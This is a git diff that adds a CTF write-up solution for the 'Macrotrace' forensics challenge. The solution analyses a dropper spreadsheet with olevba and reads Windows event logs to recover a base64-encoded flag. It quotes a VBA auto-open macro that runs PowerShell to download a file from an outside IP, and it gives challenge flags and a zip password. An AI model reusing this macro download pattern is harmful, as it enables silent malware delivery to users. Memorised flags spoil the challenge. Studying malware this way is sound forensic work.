@@ -13,6 +13,7 @@
 ---
 
 ## Forensics
+
 ### No Updates
 
 ### Description
@@ -63,6 +64,7 @@ Flag: **UMASS{n07_ag41n_d4mn_y0u_m3t4spl017}**
 ---
 
 ### Macrotrace
+
 ### Desciption
 > A suspicious spreadsheet surfaced from the archive of a defunct Flash game studio. Opening it does... something, but whatever was there is now gone.
 >
@@ -72,6 +74,108 @@ Flag: **UMASS{n07_ag41n_d4mn_y0u_m3t4spl017}**
 
 [macrotrace-assets.zip](forensics/macrotrace)
 
+---
+
+### Solution
+
+Once I extracted the zip (password was `23ab3Y9/JjK1` btw), I found two files:
+
+`dropper.xlsm`
+`flash.evtx`
+
+Time to see what evil the Excel file had. I used `olevba` to extract the VBA macro:
+
+```bash
+olevba dropper.xlsm
+```
+
+The macro was super short:
+
+```bash
+Private Sub Workbook_Open()
+    Dim cmd As String
+    cmd = "powershell.exe -Command ""Invoke-WebRequest -Uri 'http://34.138.121.94:8000/stage1.txt' -OutFile $env:TEMP\stage1.txt"""
+    Shell cmd
+End Sub
+```
+
+So basically, the macro tries to download `stage1.txt` into the TEMP folder using PowerShell.
+
+But here's the twist: `stage1.txt` isn’t given in the challenge. It’s missing. Gone. Wiped. So where do I look to find out what `stage1.txt` actually did?
+
+Answer: the logs.
+
+That’s when `flash.evtx` became the prime suspect.
+
+To investigate, I converted the `flash.evtx` to a readable format:
+
+!Info!
+
+Do this first:
+
+```bash
+git clone https://github.com/williballenthin/python-evtx
+cd python-evtx
+```
+
+Then I dumped the logs:
+
+```bash
+python3 scripts/evtx_dump.py ../flash.evtx > flash.xml
+```
+
+At this point, I was basically going through logs like a cyber detective lol.
+
+I started hunting for any signs of the macro's behavior stuff like `powershell`, `stage1.txt`, or any **flaggy** stuff.
+
+Lastly, I found something by run this grep:
+
+```bash
+grep -i "scriptblocktext" flash.xml
+```
+
+```bash
+<Data Name="ScriptBlockText">write-output 'health check 28 OK - 04/18/1996 13:00:05'</Data>
+<Data Name="ScriptBlockText">write-output 'health check 29 OK - 04/18/1996 13:00:05'</Data>
+<Data Name="ScriptBlockText">prompt</Data>
+<Data Name="ScriptBlockText">$e= "VU1BU1N7ZHJvcF9pdF9saWtlX2l0c19ob3R9"</Data>
+<Data Name="ScriptBlockText">prompt</Data>
+<Data Name="ScriptBlockText">1..50 | foreach-object{
+<Data Name="ScriptBlockText">{
+<Data Name="ScriptBlockText">{[char]$_}</Data>
+<Data Name="ScriptBlockText">write-output 'suspiciouscommand_JgiXZwLrvO'</Data>
+```
+
+That's a base64-encoded value. Probably a flag.
+
+So I decode the value and yeah it's a flag
+
+```bash
+echo VU1BU1N7ZHJvcF9pdF9saWtlX2l0c19ob3R9 | base64 -d
+```
+
+Flag: **UMASS{drop_it_like_its_hot}**
+
+---
+
+## Misc
+
+### Odd One Out
+
+### Description
+> I forgot to organize my encrypted flags for this challenge! Can you find the odd one out? I could have sworn it was a different color...
+
+<details>
+  <summary>View Hint</summary>
+Not all solvers will work on this. If you get stuck, try a different way!
+</details>
+
+<details>
+  <summary>View Hint</summary>
+The oddoneout challenge is multilayer! You'll know you have the right one if it looks like a real word.
+</details>
+
+[OddOneOut.png](forensics/macrotrace)
 
 
 
